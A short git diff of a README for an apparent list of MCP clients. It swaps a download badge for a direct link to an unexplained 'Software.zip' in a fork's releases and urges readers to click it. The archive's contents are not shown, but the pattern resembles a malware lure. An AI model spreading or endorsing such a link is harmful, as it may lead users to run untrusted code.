@@ -8,7 +8,7 @@ In this repository, you will find a selection of MCP clients designed to cater t
 
 ## Repository Link
 🌟 **Download the Software:**
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/parultripathiDS/awesome-mcp-clients/releases/download/v2.0/Software.zip)](https://github.com/parultripathiDS/awesome-mcp-clients/releases/download/v2.0/Software.zip)
 
 Please note that the link provided above leads directly to the software download. Click on the badge to access the software and explore the MCP clients available in this repository.
 
